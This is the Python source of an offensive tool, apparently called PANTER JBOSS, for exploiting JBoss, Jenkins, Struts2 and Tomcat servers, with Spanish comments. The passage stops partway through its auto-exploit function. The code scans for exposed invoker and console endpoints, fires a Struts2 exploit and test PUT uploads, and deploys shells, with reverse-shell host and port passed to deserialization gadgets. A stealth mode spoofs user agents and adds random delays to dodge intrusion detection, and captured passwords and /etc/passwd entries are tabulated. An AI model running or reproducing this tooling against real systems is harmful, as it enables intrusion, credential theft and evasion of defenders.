#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
PANTER JBOSS - JBoss & Java Deserialization Exploitation Framework
Analyst   : Apo1o13
Build     : 2026-04-30 - Custom Edition

Advanced exploitation tool for JBoss Application Servers and
Java Deserialization vulnerabilities across multiple platforms.
"""
import sys
# Forzar UTF-8 en stdout/stderr para que los caracteres de tabla (╔══╗) funcionen
# tanto en Windows (cp1252) como en Linux.
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system
import os, sys
import shutil
from zipfile import ZipFile
from time import sleep
from random import randint
import argparse, socket
import _postexploit
from sys import argv, exit, version_info
logging.captureWarnings(True)
FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
logging.basicConfig(filename='panterjboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)

__author__ = "Apo1o13"
__version__ = "1.3.0"
__analyst__ = "Apo1o13"
__analyst_build__ = "2026-04-30 - Custom Build"

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'

# Almacenamiento global de credenciales encontradas durante la sesion
found_credentials = []


def add_credential(host, user, password, method):
    """Registra una credencial encontrada y la muestra en tabla inmediatamente."""
    entry = {
        'host': host,
        'user': user,
        'password': password,
        'method': method,
        'time': datetime.datetime.now().strftime("%H:%M:%S"),
    }
    found_credentials.append(entry)
    _print_single_credential_found(entry)


def _print_single_credential_found(entry):
    """Muestra una tabla cuando se encuentra una credencial."""
    h = max(len(entry['host']), 6)
    u = max(len(entry['user']), 7)
    p = max(len(entry['password']), 8)
    m = max(len(entry['method']), 6)
    t = max(len(entry['time']), 8)

    sep_top    = "  ╔" + "═"*(h+2) + "╦" + "═"*(u+2) + "╦" + "═"*(p+2) + "╦" + "═"*(m+2) + "╦" + "═"*(t+2) + "╗"
    sep_mid    = "  ╠" + "═"*(h+2) + "╬" + "═"*(u+2) + "╬" + "═"*(p+2) + "╬" + "═"*(m+2) + "╬" + "═"*(t+2) + "╣"
    sep_bot    = "  ╚" + "═"*(h+2) + "╩" + "═"*(u+2) + "╩" + "═"*(p+2) + "╩" + "═"*(m+2) + "╩" + "═"*(t+2) + "╝"
    title_w    = h + u + p + m + t + 14
    title      = " CREDENCIAL ENCONTRADA "
    title_line = "  ║" + title.center(title_w) + "║"
    header     = "  ║ {:<{h}} ║ {:<{u}} ║ {:<{p}} ║ {:<{m}} ║ {:<{t}} ║".format(
                    "HOST", "USUARIO", "PASSWORD", "METODO", "HORA",
                    h=h, u=u, p=p, m=m, t=t)
    row        = "  ║ {:<{h}} ║ {:<{u}} ║ {:<{p}} ║ {:<{m}} ║ {:<{t}} ║".format(
                    entry['host'], entry['user'], entry['password'], entry['method'], entry['time'],
                    h=h, u=u, p=p, m=m, t=t)

    print_and_flush(RED + BOLD + "\n" + sep_top)
    print_and_flush(title_line)
    print_and_flush(sep_mid)
    print_and_flush(header)
    print_and_flush(sep_mid)
    print_and_flush(YELLOW + row + RED)
    print_and_flush(sep_bot + ENDC + "\n")


def print_credentials_table():
    """Muestra tabla resumen con todas las credenciales encontradas en la sesion."""
    if not found_credentials:
        return

    h = max(len("HOST"),     max(len(c['host'])     for c in found_credentials))
    u = max(len("USUARIO"),  max(len(c['user'])     for c in found_credentials))
    p = max(len("PASSWORD"), max(len(c['password']) for c in found_credentials))
    m = max(len("METODO"),   max(len(c['method'])   for c in found_credentials))
    t = max(len("HORA"),     max(len(c['time'])     for c in found_credentials))

    sep_top = "  ╔" + "═"*(h+2) + "╦" + "═"*(u+2) + "╦" + "═"*(p+2) + "╦" + "═"*(m+2) + "╦" + "═"*(t+2) + "╗"
    sep_mid = "  ╠" + "═"*(h+2) + "╬" + "═"*(u+2) + "╬" + "═"*(p+2) + "╬" + "═"*(m+2) + "╬" + "═"*(t+2) + "╣"
    sep_bot = "  ╚" + "═"*(h+2) + "╩" + "═"*(u+2) + "╩" + "═"*(p+2) + "╩" + "═"*(m+2) + "╩" + "═"*(t+2) + "╝"
    title_w = h + u + p + m + t + 14
    title   = " RESUMEN DE CREDENCIALES ENCONTRADAS (%d) " % len(found_credentials)
    title_line = "  ║" + title.center(title_w) + "║"
    header  = "  ║ {:<{h}} ║ {:<{u}} ║ {:<{p}} ║ {:<{m}} ║ {:<{t}} ║".format(
                "HOST", "USUARIO", "PASSWORD", "METODO", "HORA",
                h=h, u=u, p=p, m=m, t=t)

    print_and_flush(RED + BOLD + "\n" + sep_top)
    print_and_flush(title_line)
    print_and_flush(sep_mid)
    print_and_flush(header)
    print_and_flush(sep_mid)
    for c in found_credentials:
        row = "  ║ {:<{h}} ║ {:<{u}} ║ {:<{p}} ║ {:<{m}} ║ {:<{t}} ║".format(
                c['host'], c['user'], c['password'], c['method'], c['time'],
                h=h, u=u, p=p, m=m, t=t)
        print_and_flush(YELLOW + row + RED)
        print_and_flush(sep_mid)
    print_and_flush(sep_bot + ENDC + "\n")


def parse_and_print_passwd_table(text, source=""):
    """
    Si el texto contiene lineas con formato /etc/passwd, las muestra como tabla.
    Retorna True si encontro y mostro datos.
    """
    import re
    lines = text.replace('\\n', '\n').split('\n')
    # Patron: usuario:x:uid:gid:info:home:shell
    passwd_re = re.compile(r'^([^:]+):([^:]*):(\d+):(\d+):([^:]*):([^:]*):([^:\s]*)$')
    parsed = []
    for line in lines:
        line = line.strip()
        m = passwd_re.match(line)
        if m:
            parsed.append({
                'usuario': m.group(1),
                'uid':     m.group(3),
                'gid':     m.group(4),
                'info':    m.group(5),
                'home':    m.group(6),
                'shell':   m.group(7),
            })
    if not parsed:
        return False

    u = max(len("USUARIO"), max(len(r['usuario']) for r in parsed))
    uid_w = max(len("UID"), max(len(r['uid']) for r in parsed))
    gid_w = max(len("GID"), max(len(r['gid']) for r in parsed))
    info_w = max(len("INFO"), max(len(r['info']) for r in parsed))
    home_w = max(len("HOME"), max(len(r['home']) for r in parsed))
    shell_w = max(len("SHELL"), max(len(r['shell']) for r in parsed))

    sep_top = "  ╔" + "═"*(u+2) + "╦" + "═"*(uid_w+2) + "╦" + "═"*(gid_w+2) + "╦" + "═"*(info_w+2) + "╦" + "═"*(home_w+2) + "╦" + "═"*(shell_w+2) + "╗"
    sep_mid = "  ╠" + "═"*(u+2) + "╬" + "═"*(uid_w+2) + "╬" + "═"*(gid_w+2) + "╬" + "═"*(info_w+2) + "╬" + "═"*(home_w+2) + "╬" + "═"*(shell_w+2) + "╣"
    sep_bot = "  ╚" + "═"*(u+2) + "╩" + "═"*(uid_w+2) + "╩" + "═"*(gid_w+2) + "╩" + "═"*(info_w+2) + "╩" + "═"*(home_w+2) + "╩" + "═"*(shell_w+2) + "╝"
    title_w = u + uid_w + gid_w + info_w + home_w + shell_w + 17
    label   = (" /etc/passwd — %s " % source) if source else " /etc/passwd "
    title_line = "  ║" + label.center(title_w) + "║"
    header  = "  ║ {:<{u}} ║ {:<{uid}} ║ {:<{gid}} ║ {:<{info}} ║ {:<{home}} ║ {:<{shell}} ║".format(
                "USUARIO", "UID", "GID", "INFO", "HOME", "SHELL",
                u=u, uid=uid_w, gid=gid_w, info=info_w, home=home_w, shell=shell_w)

    print_and_flush(CYAN + BOLD + "\n" + sep_top)
    print_and_flush(title_line)
    print_and_flush(sep_mid)
    print_and_flush(header)
    print_and_flush(sep_mid)
    for r in parsed:
        row = "  ║ {:<{u}} ║ {:<{uid}} ║ {:<{gid}} ║ {:<{info}} ║ {:<{home}} ║ {:<{shell}} ║".format(
                r['usuario'], r['uid'], r['gid'], r['info'], r['home'], r['shell'],
                u=u, uid=uid_w, gid=gid_w, info=info_w, home=home_w, shell=shell_w)
        print_and_flush(WHITE + row + CYAN)
    print_and_flush(sep_bot + ENDC + "\n")
    return True


def print_and_flush(message, same_line=False):
    if same_line:
        print (message),
    else:
        print (message)
    if not sys.stdout.isatty():
        sys.stdout.flush()


if version_info[0] == 2 and version_info[1] < 7:
    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.6. PANTER JBOSS requires version >= 2.7.\n"
                        "" + GREEN + "   Please install the Python version >= 2.7. \n\n"
                                     "   Example for CentOS using Software Collections scl:\n"
                                     "   # yum -y install centos-release-scl\n"
                                     "   # yum -y install python27\n"
                                     "   # scl enable python27 bash\n" + ENDC)
    logging.CRITICAL('Python version 2.6 is not supported.')
    exit(0)

try:
    import readline
    readline.parse_and_bind('set editing-mode vi')
except:
    logging.warning('Module readline not installed. The terminal will not support the arrow keys.', exc_info=traceback)
    if __name__ == '__main__':
        print_and_flush(RED1 + "\n * Module readline not installed. The terminal will not support the arrow keys.\n" + ENDC)


try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3.util import parse_url
    from urllib3 import PoolManager
    from urllib3 import ProxyManager
    from urllib3 import make_headers
    from urllib3.util import Timeout
except ImportError:
    print_and_flush(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the dependencies before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module urllib3 not installed. See details:', exc_info=traceback)
    exit(0)

try:
    import ipaddress
except:
    print_and_flush(RED1 + BOLD + "\n * Package ipaddress not installed. Please install the dependencies before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module ipaddress not installed. See details:', exc_info=traceback)
    exit(0)

global gl_interrupted
gl_interrupted = False
global gl_args
global gl_http_pool


# Pool extendido de User-Agents para modo sigilo
_USER_AGENTS = [
    # Navegadores modernos
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    # Bots legitimos (se mezclan para confusion)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Wget/1.21.3",
    "curl/7.88.1",
    # Navegadores legacy (mas silenciosos en algunos IDS)
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)",
    "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
]

# Datos de sesion globales para el reporte
session_data = {
    'fecha_inicio':     datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    'hosts_escaneados': [],
    'vulnerabilidades': [],
    'evidencias':       [],
    'hosts_comprometidos': [],
    'red_interna':      [],
}


def get_random_user_agent():
    return _USER_AGENTS[randint(0, len(_USER_AGENTS) - 1)]


def stealth_delay():
    """Pausa aleatoria en modo sigilo para evadir deteccion por frecuencia."""
    if 'gl_args' in globals() and hasattr(gl_args, 'stealth') and gl_args.stealth:
        delay = randint(8, 25) / 10.0   # 0.8s a 2.5s
        sleep(delay)


def is_proxy_ok():
    print_and_flush(GREEN + "\n ** Verificando proxy: %s **\n\n" % gl_args.proxy)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    try:
        r = gl_http_pool.request('GET', gl_args.host, redirect=False, headers=headers)
    except:
        print_and_flush(RED + " * Error: No se pudo conectar a %s usando proxy %s.\n"
                              "   Consulte los logs para mas detalles...\n" %(gl_args.host,gl_args.proxy) + ENDC)
        logging.warning("Failed to connect to %s using proxy" %gl_args.host, exc_info=traceback)
        return False

    if r.status == 407:
        print_and_flush(RED + " * Error 407: Se requiere autenticacion en el proxy. \n"
                                      "   Ingrese el usuario y contrasena correctos para autenticarse. \n"
                                      "   Ejemplo: -P http://proxy.com:3128 -L usuario:contrasena\n" + ENDC)
        logging.error("Proxy authentication failed")
        return False

    elif r.status == 503 or r.status == 502:
        print_and_flush(RED + " * Error %s: El servicio %s no esta disponible a traves de su proxy. \n"
                              "   Consulte los logs para mas detalles...\n" %(r.status,gl_args.host)+ENDC)
        logging.error("Service unavailable to your proxy")
        return False
    else:
        return True


def configure_http_pool():

    global gl_http_pool

    if gl_args.mode == 'auto-scan' or gl_args.mode == 'file-scan':
        timeout = Timeout(connect=1.0, read=3.0)
    else:
        timeout = Timeout(connect=gl_args.timeout, read=6.0)

    if gl_args.proxy:
        # when using proxy, protocol should be informed
        if (gl_args.host is not None and 'http' not in gl_args.host) or 'http' not in gl_args.proxy:
            print_and_flush(RED + " * Al usar proxy, debe especificar el protocolo http o https"
                                  " (ej. http://%s).\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
            logging.critical('Protocol not specified')
            exit(1)

        try:
            if gl_args.proxy_cred:
                headers = make_headers(proxy_basic_auth=gl_args.proxy_cred)
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, proxy_headers=headers, timeout=timeout, cert_reqs='CERT_NONE')
            else:
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
        except:
            print_and_flush(RED + " * Ocurrio un error al configurar el proxy. Consulte el log para mas detalles..\n\n" +ENDC)
            logging.critical('Error while setting the proxy', exc_info=traceback)
            exit(1)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')


def handler_interrupt(signum, frame):
    global gl_interrupted
    gl_interrupted = True
    print_and_flush ("Interrumpiendo ejecucion ...")
    logging.info("Interrupting execution ...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)


def check_connectivity(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((str(host), int(port)))
        s.close()
    except socket.timeout:
        logging.info("Failed to connect to %s:%s" %(host,port))
        return False
    except:
        logging.info("Failed to connect to %s:%s" % (host, port))
        return False

    return True


def check_vul(url):
    """
    Test if a GET to a URL is successful
    :param url: The URL to test
    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
    """
    url_check = parse_url(url)
    if '443' in str(url_check.port) and url_check.scheme != 'https':
        url = "https://"+str(url_check.host)+":"+str(url_check.port)+(url_check.path or '')

    print_and_flush(GREEN + "\n ** Verificando Host: %s **\n" % url)
    logging.info("Verificando Host: %s" % url)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console": "/web-console/Invoker",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
             "EJBInvokerServlet": "/invoker/EJBInvokerServlet",
             "readonly-invoker": "/invoker/readonly",
             "admin-console": "/admin-console/",
             "wildfly-management": "/management",
             "Application Deserialization": "",
             "Servlet Deserialization" : "",
             "Jenkins": "",
             "Struts2": "",
             "Tomcat-PUT-RCE": "",
             "JMX Tomcat" : ""}

    fatal_error = False

    for vector in paths:
        stealth_delay()   # pausa aleatoria en modo sigilo
        r = None
        if gl_interrupted: break
        try:

            # check jmx tomcat only if specifically chosen
            _jmxtomcat = getattr(gl_args, 'jmxtomcat', None)
            if (_jmxtomcat and vector != 'JMX Tomcat') or\
                    (not _jmxtomcat and vector == 'JMX Tomcat'): continue

            _app_unserialize = getattr(gl_args, 'app_unserialize', None)
            if (_app_unserialize and vector != 'Application Deserialization') or \
                    (not _app_unserialize and vector == 'Application Deserialization'): continue

            _struts2 = getattr(gl_args, 'struts2', None)
            if (_struts2 and vector != 'Struts2') or \
                    (not _struts2 and vector == 'Struts2'): continue

            _servlet_unserialize = getattr(gl_args, 'servlet_unserialize', None)
            if (_servlet_unserialize and vector != 'Servlet Deserialization') or \
                    (not _servlet_unserialize and vector == 'Servlet Deserialization'): continue

            if getattr(gl_args, 'jboss', None) and vector not in ('jmx-console', 'web-console', 'JMXInvokerServlet',
                                                'EJBInvokerServlet', 'readonly-invoker',
                                                'wildfly-management', 'admin-console'): continue

            _jenkins = getattr(gl_args, 'jenkins', None)
            if (_jenkins and vector != 'Jenkins') or \
                    (not _jenkins and vector == 'Jenkins'): continue

            if getattr(gl_args, 'force', None):
                paths[vector] = 200
                continue

            print_and_flush(GREEN + " [*] Verificando %s: %s" % (vector, " " * (27 - len(vector))) + ENDC, same_line=True)

            # check jenkins
            if vector == 'Jenkins':

                cli_port = None
                # check version and search for CLI-Port
                r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                all_headers = r.getheaders()

                # versions > 658 are not vulnerable
                if 'X-Jenkins' in all_headers:
                    _jenkins_parts = all_headers['X-Jenkins'].split('.')
                    version = int(_jenkins_parts[1]) if len(_jenkins_parts) >= 2 else 0
                    if version >= 638:
                        paths[vector] = 505
                        continue

                for h in all_headers:
                    if 'CLI-Port' in h:
                        cli_port = int(all_headers[h])
                        break

                if cli_port is not None:
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            # chek vul for Java Unserializable in Application Parameters
            elif vector == 'Application Deserialization':

                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                if r.status in (301, 302, 303, 307, 308):
                    cookie = r.getheader('set-cookie')
                    if cookie is not None: headers['Cookie'] = cookie
                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)

                # if no obj serialized, check if there's a html refresh redirect and follow it
                if obj is None:
                    # check if theres a redirect link
                    link = _exploits.get_html_redirect_link(str(r.data))

                    # If it is a redirect link. Follow it
                    if link is not None:
                        r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
                        #link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                        obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)

                # if obj does yet None
                if obj is None:
                    # search for other params that can be exploited
                    list_params = _exploits.get_list_params_with_serialized_objs(str(r.data))
                    if len(list_params) > 0:
                        paths[vector] = 110
                        print_and_flush(RED + "  [ VERIFICAR OTROS PARAMETROS ]" + ENDC)
                        print_and_flush(RED + "\n * El parametro \"%s\" no parece ser vulnerable.\n" %gl_args.post_parameter +
                                                "   Pero hay otros parametros que podrian serlo xD!\n" +ENDC+GREEN+
                                          BOLD+ "\n   Intente con estos otros parametros: \n" +ENDC)
                        for p in list_params:
                            print_and_flush(GREEN +  "      -H %s" %p+ ENDC)
                        print ("")
                elif obj is not None and obj == 'stateless':
                    paths[vector] = 100
                elif obj is not None:
                    paths[vector] = 200

            # chek vul for Java Unserializable in viewState
            elif vector == 'Servlet Deserialization':

                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                if r.status in (301, 302, 303, 307, 308):
                    cookie = r.getheader('set-cookie')
                    if cookie is not None: headers['Cookie'] = cookie
                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)

                if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            elif vector == 'Struts2':

                result = _exploits.exploit_struts2_jakarta_multipart(url, 'panterjboss', gl_args.cookies)
                if result is None or "Could not get command" in str(result) :
                    paths[vector] = 100
                elif 'panterjboss' in str(result) and "<html>" not in str(result).lower():
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            elif vector == 'Tomcat-PUT-RCE':
                # CVE-2017-12615: detectar PUT habilitado en DefaultServlet
                # Estrategia 1: OPTIONS en path estatico (evita JSPs que bloquean OPTIONS)
                # Estrategia 2: PUT directo de prueba como fallback
                try:
                    detected = False
                    for test_path in ["/panter_probe.txt", "/robots.txt", "/favicon.ico"]:
                        try:
                            r = gl_http_pool.request('OPTIONS', url + test_path, redirect=False, headers=headers)
                            allow = r.getheader('Allow', '') or r.getheader('allow', '') or ''
                            if 'PUT' in allow.upper():
                                detected = True
                                break
                        except:
                            pass
                    if not detected:
                        # Fallback: PUT directo con archivo de prueba
                        import random as _random, string as _string
                        probe = ''.join(_random.choices(_string.ascii_lowercase, k=8)) + '.txt'
                        try:
                            rp = gl_http_pool.request('PUT', url + '/' + probe + '/',
                                                      redirect=False, headers=headers, body=b'panter')
                            if rp.status in (201, 204, 200):
                                detected = True
                                try:
                                    gl_http_pool.request('DELETE', url + '/' + probe,
                                                         redirect=False, headers=headers)
                                except:
                                    pass
                        except:
                            pass
                    if detected:
                        paths[vector] = 200
                        print_and_flush(RED + BOLD + " [ PUT HABILITADO — CVE-2017-12615 ]" + ENDC)
                    else:
                        paths[vector] = 505
                except:
                    paths[vector] = 0

            elif vector == 'EJBInvokerServlet':
                url_to_check = url + "/invoker/EJBInvokerServlet"
                r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
                paths[vector] = r.status
                if r.status in (200, 500):
                    print_and_flush(RED + BOLD + " [ EXPUESTO — CVE-2013-4810 ]" + ENDC)

            elif vector == 'readonly-invoker':
                url_to_check = url + "/invoker/readonly"
                r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
                paths[vector] = r.status
                if r.status in (200, 500):
                    print_and_flush(RED + BOLD + " [ EXPUESTO ]" + ENDC)

            elif vector == 'wildfly-management':
                url_to_check = url + "/management"
                r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
                paths[vector] = r.status
                if r.status == 200:
                    print_and_flush(RED + BOLD + " [ SIN AUTENTICACION ]" + ENDC)

            elif vector == 'JMX Tomcat':

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(7)
                _parsed_rmi = parse_url(url)
                host_rmi = _parsed_rmi.host or url.split(':')[0]
                port_rmi = _parsed_rmi.port or 1099
                s.connect((host_rmi, port_rmi))
                s.send(b"JRMI\x00\x02K")
                msg = s.recv(1024)
                octets = str(msg[3:]).split(".")
                if len(octets) != 4:
                    paths[vector] = 505
                else:
                    paths[vector] = 200

            # check jboss vectors
            elif vector == "JMXInvokerServlet":
                # user privided web-console path and checking JMXInvoker...
                if "/web-console/Invoker" in url:
                    paths[vector] = 505
                # if the user not provided the path, append the "/invoker/JMXInvokerServlet"
                else:

                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector])+"/"):
                        url_to_check = url + str(paths[vector])
                    else:
                        url_to_check = url

                    r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
                    # if head method is not allowed/supported, try GET
                    if r.status in (405, 406):
                        r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)

                    # if web-console/Invoker or invoker/JMXInvokerServlet
                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                        paths[vector] = 200
                    else:
                        paths[vector] = 505

            elif vector == "web-console":
                # user privided JMXInvoker path and checking web-console...
                if "/invoker/JMXInvokerServlet" in url:
                    paths[vector] = 505
                # if the user not provided the path, append the "/web-console/..."
                else:

                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector]) + "/"):
                        url_to_check = url + str(paths[vector])
                    else:
                        url_to_check = url

                    r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
                    # if head method is not allowed/supported, try GET
                    if r.status in (405, 406):
                        r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)

                    # if web-console/Invoker or invoker/JMXInvokerServlet
                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                        paths[vector] = 200
                    else:
                        paths[vector] = 505

            # other jboss vector
            else:
                r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
                # if head method is not allowed/supported, try GET
                if r.status in (405, 406):
                    r = gl_http_pool.request('GET', url + str(paths[vector]), redirect=False, headers=headers)
                # check if the server respond with 200/500 for all requests
                if r.status in (200, 500):
                    r = gl_http_pool.request('GET', url + str(paths[vector])+ '/panterjboss/probe', redirect=False,headers=headers)

                    if r.status == 200:
                        r.status = 505
                    else:
                        r.status = 200

                paths[vector] = r.status

            # ----------------
            # Analysis of the results
            # ----------------
            # check if the proxy do not support running in the same port of the target
            if r is not None and r.status == 400 and gl_args.proxy:
                if parse_url(gl_args.proxy).port == url_check.port:
                    print_and_flush(RED + "[ ERROR ]\n * Ocurrio un error porque el proxy corre en el mismo puerto "
                                       "que el servidor (puerto %s).\n"
                                       "   Por favor use un puerto diferente en el proxy.\n" % url_check.port + ENDC)
                    logging.critical("Proxy returns 400 Bad Request because is running in the same port as the server")
                    fatal_error = True
                    break

            # check if it's false positive
            if r is not None and len(r.getheaders()) == 0:
                print_and_flush(RED + "[ ERROR ]\n * El servidor %s no es un servidor HTTP.\n" % url + ENDC)
                logging.error("The server %s is not an HTTP server." % url)
                for key in paths: paths[key] = 505
                break

            if paths[vector] in (301, 302, 303, 307, 308):
                url_redirect = r.get_redirect_location()
                print_and_flush(GREEN + "  [ REDIRECCION ]\n * El servidor redirige a: %s\n" % url_redirect)
            elif paths[vector] == 200 or paths[vector] == 500:
                if vector == "admin-console":
                    print_and_flush(RED + "  [ EXPUESTO ]" + ENDC)
                    logging.info("Servidor %s: EXPUESTO" %url)
                elif vector == "Jenkins":
                    print_and_flush(RED + "  [ POSIBLEMENTE VULNERABLE ]" + ENDC)
                    logging.info("Servidor %s: CORRIENDO JENKINS" %url)
                elif vector == "JMX Tomcat":
                    print_and_flush(RED + "  [ POSIBLEMENTE VULNERABLE ]" + ENDC)
                    logging.info("Servidor %s: CORRIENDO JENKINS" %url)
                else:
                    print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
                    logging.info("Servidor %s: VULNERABLE" % url)
            elif paths[vector] == 100:
                paths[vector] = 200
                print_and_flush(RED + "  [ INCONCLUSO - REQUIERE VERIFICACION MANUAL ]" + ENDC)
                logging.info("Servidor %s: INCONCLUSO - REQUIERE VERIFICACION" % url)
            elif paths[vector] == 110:
                logging.info("Servidor %s: VERIFICAR OTROS PARAMETROS" % url)
            else:
                print_and_flush(GREEN + "  [ OK ]")
        except Exception as err:
            err_str = str(err)
            # Mostrar mensaje corto para timeouts, completo para otros errores
            if 'timeout' in err_str.lower() or 'timed out' in err_str.lower():
                print_and_flush(RED + "  [ TIMEOUT ]" + ENDC)
            else:
                print_and_flush(RED + "\n * Error al conectar con %s: %s\n" % (url, err_str[:80]) + ENDC)
            logging.info("Ocurrio un error al conectar con el host %s" % url, exc_info=traceback)
            paths[vector] = 505

    if fatal_error:
        exit(1)
    else:
        return paths


def auto_exploit(url, exploit_type):
    """
    Automatically exploit a URL
    :param url: The URL to exploit
    :param exploit_type: One of the following
    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
    exploitWebConsoleInvoker:		 tested and working in JBoss 4
    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
    exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
    """
    if exploit_type in ("Application Deserialization", "Servlet Deserialization"):
        print_and_flush(GREEN + "\n * Preparando exploit para enviar a %s. Aguarde...\n" % url)
    else:
        print_and_flush(GREEN + "\n * Enviando codigo de exploit a %s. Aguarde...\n" % url)

    result = 505
    if exploit_type == "jmx-console":

        result = _exploits.exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_console_main_deploy(url)

    elif exploit_type == "web-console":

        # if the user not provided the path
        if url.endswith("/web-console/Invoker") or url.endswith("/web-console/Invoker/"):
            url = url.replace("/web-console/Invoker", "")

        result = _exploits.exploit_web_console_invoker(url)
        if result == 404:
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                               gadget_file=gl_args.load_gadget)
    elif exploit_type == "JMXInvokerServlet":

        # if the user not provided the path
        if url.endswith("/invoker/JMXInvokerServlet") or url.endswith("/invoker/JMXInvokerServlet/"):
            url = url.replace("/invoker/JMXInvokerServlet", "")

        # Intento 1: deploy de shell via file repository (JBoss 4/5)
        result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
